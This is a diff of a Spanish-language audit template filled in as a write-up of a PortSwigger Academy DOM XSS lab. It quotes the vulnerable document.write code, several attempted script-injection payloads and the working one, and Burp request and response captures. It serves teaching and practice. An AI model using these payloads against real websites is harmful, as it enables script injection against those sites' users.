@@ -4,9 +4,9 @@
 
 <details>
 
-<summary>👁️ RECONOCIMIENTO PASIVO</summary>
+<summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
-## AUDITORIA DE: ((RELEVANT))
+## AUDITORIA DE: ((Laboratorio: DOM XSS en document.write el fregadero usando la fuente location.search))
 
 ***
 
@@ -14,13 +14,55 @@
 
 ### RECONOCIMIENTO PASIVO
 
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+*   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    ANALIZANDO SCRIPT DE JAVASCRIPT QUE MANEJA LAS BUSQUEDAS PARA MOSTRARLAS EN ELDOM O SITIO:
+
+
+
+    function trackSearch(query) {
+            
+                document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+            }
+            
+            var query = (new URLSearchParams(window.location.search)).get('search');
+            
+            if(query) {
+                trackSearch(query);
+            }
+                      
+                      
+
+
+    PROBANDO EN EL BROWSER DISTINTOS PAYLOADS:
+
+                      
+
+    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search=%22%3Cscript%3Ealert(%27P4IM0N%27);%3C/script%3E  NO
+
+
+
+    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="<script>alert('P4IM0N');</script> NO
+
+
+
+    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="<scr<script>ipt>alert('P4IM0N');</scr</script>ipt>  NO
+
+
+    "<sscrcscrrscr<script>ipt>alert('P4IM0N');</sscrcscrrscr</script>ipt> NO
+
+
+    FUNCIONO:
+
+    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="><script>alert('¡P4IM0N-XSS!')</script> SI
+
     ```
 
-    * CONCLUSION:
+    * CONCLUSION: LUEGO DE ANALIZAR EL SCRIPT Y COMO TRATA NUESTRA BUSQUEDA DENTRO DEL MISMO QUE CORRE SOBRE L MISMSO DOM, VEMOS QUE SI INGRESAMOS: "> CONJUNTAMENTE CON NUESTRO PAYLOAD : alert('¡P4IM0N-XSS!') , LO QUE LOGRAMOS HACER ES CERRAR LA RUTA DE SEARCHTERM Y CERRAR LA ETIQUETA IMG PARA QUE NUESTRO PAYLOAD SE EJECUTE E INGRESE EN EL DOM Y RESOLVIMOS EL LABORATORIO.
+    *
+
+        <figure><img src="../../../.gitbook/assets/DOM-XSS (3).png" alt=""><figcaption></figcaption></figure>
 *   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
@@ -225,7 +267,7 @@
 
 <details>
 
-<summary>🔬 ANALISIS FORENSE</summary>
+<summary>🔬 ANALISIS FORENSE ❌</summary>
 
 ### ANALISIS FORENSE
 
@@ -424,7 +466,7 @@
 
 <details>
 
-<summary>👊 RECONOCIMIENTO ACTIVO</summary>
+<summary>👊 RECONOCIMIENTO ACTIVO ✔️</summary>
 
 ### RECONOCIMIENTO ACTIVO
 
@@ -498,13 +540,153 @@
     ```
 
     * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    REQUEST EN BUSQUEDA NORMAL:
+
+
+
+
+    GET /?search=elixir HTTP/2
+    Host: 0a6000e604685435839f87cc004a0084.web-security-academy.net
+    Cookie: session=SeBs4anKs7nJTgKJ2MfEbzg8FRcgEEC1
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a6000e604685435839f87cc004a0084.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    Connection: close
+
+
+
+
+    RESPONSE 
+
+
+    HTTP/2 200 OK
+    Content-Type: text/html; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 3654
+
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+            <link href=/resources/css/labsBlog.css rel=stylesheet>
+            <title>DOM XSS in document.write sink using source location.search</title>
+        </head>
+        <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+                <section class='academyLabBanner'>
+                    <div class=container>
+                        <div class=logo></div>
+                            <div class=title-container>
+                                <h2>DOM XSS in <code>document.write</code> sink using source <code>location.search</code></h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink'>
+                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
+                            <div class='widgetcontainer-lab-status is-notsolved'>
+                                <span>LAB</span>
+                                <p>Not solved</p>
+                                <span class=lab-status-icon></span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            <div theme="blog">
+                <section class="maincontainer">
+                    <div class="container is-page">
+                        <header class="navigation-header">
+                            <section class="top-links">
+                                <a href=/>Home</a><p>|</p>
+                            </section>
+                        </header>
+                        <header class="notification-header">
+                        </header>
+                        <section class=blog-header>
+                            <h1>0 search results for 'elixir'</h1>
+                            <hr>
+                        </section>
+                        <section class=search>
+                            <form action=/ method=GET>
+                                <input type=text placeholder='Search the blog...' name=search>
+                                <button type=submit class=button>Search</button>
+                            </form>
+                        </section>
+                        <script>
+                            function trackSearch(query) {
+                                document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+                            }
+                            var query = (new URLSearchParams(window.location.search)).get('search');
+                            if(query) {
+                                trackSearch(query);
+                            }
+                        </script>
+                        <section class="blog-list no-results">
+                            <div class=is-linkback>
+            <a href="/">Back to Blog</a>
+                            </div>
+                        </section>
+                    </div>
+                </section>
+                <div class="footer-wrapper">
+                </div>
+            </div>
+        </body>
+    </html>
+
+
+    ------
+
+
+
+    REQUEST CON PAYLOAT ALERT:
+
+
+
+
+    GET /?search="><script>alert('¡P4IM0N-XSS!')</script> HTTP/2
+    Host: 0a6000e604685435839f87cc004a0084.web-security-academy.net
+    Cookie: session=SeBs4anKs7nJTgKJ2MfEbzg8FRcgEEC1
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a6000e604685435839f87cc004a0084.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
     ```
 
-    * CONCLUSION:
+    * CONCLUSION: LUEGO DE ANALIZAR EL SCRIPT Y COMO TRATA NUESTRA BUSQUEDA DENTRO DEL MISMO QUE CORRE SOBRE L MISMSO DOM, VEMOS QUE SI INGRESAMOS: "> CONJUNTAMENTE CON NUESTRO PAYLOAD : alert('¡P4IM0N-XSS!') , LO QUE LOGRAMOS HACER ES CERRAR LA RUTA DE SEARCHTERM Y CERRAR LA ETIQUETA IMG PARA QUE NUESTRO PAYLOAD SE EJECUTE E INGRESE EN EL DOM Y RESOLVIMOS EL LABORATORIO.
+    *
+
+        <figure><img src="../../../.gitbook/assets/DOM-XSS (2).png" alt=""><figcaption></figcaption></figure>
 *   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
 
     ```python
@@ -861,7 +1043,7 @@
 
 <details>
 
-<summary>🕵️ INVESTIGACION OSINT</summary>
+<summary>🕵️ INVESTIGACION OSINT ❌</summary>
 
 ### INVESTIGACION OSINT
 
@@ -1060,7 +1242,7 @@
 
 <details>
 
-<summary>⛓️ HASHES Y DESENCRIPTADOS</summary>
+<summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>
 
 ### HASHES Y DESENCRIPTADOS
 
@@ -1287,7 +1469,7 @@
 
 <details>
 
-<summary>💪 FUERZA BRUTA A LOGINS</summary>
+<summary>💪 FUERZA BRUTA A LOGINS ❌ </summary>
 
 ### FUERZA BRUTA A LOGINS
 
@@ -1451,7 +1633,7 @@
 
 <details>
 
-<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS</summary>
+<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ❌</summary>
 
 ### SCRIPT DE EXPLOIT Y PAYLOADS
 
@@ -1573,7 +1755,7 @@
 
 <details>
 
-<summary>🤯 EXPLOTACION</summary>
+<summary>🤯 EXPLOTACION ❌</summary>
 
 ### EXPLOTACION
 
@@ -1758,7 +1940,7 @@
 
 <details>
 
-<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS</summary>
+<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>
 
 ### ESCALADA DE PRIVILEGIOS WINDOWS
 
@@ -2020,7 +2202,7 @@
 
 <details>
 
-<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX</summary>
+<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>
 
 ### ESCALADA DE PRIVILEGIOS LINUX
 
@@ -2247,7 +2429,7 @@
 
 <details>
 
-<summary>♻️ PIVOTING</summary>
+<summary>♻️ PIVOTING ❌</summary>
 
 ### PIVOTING
 
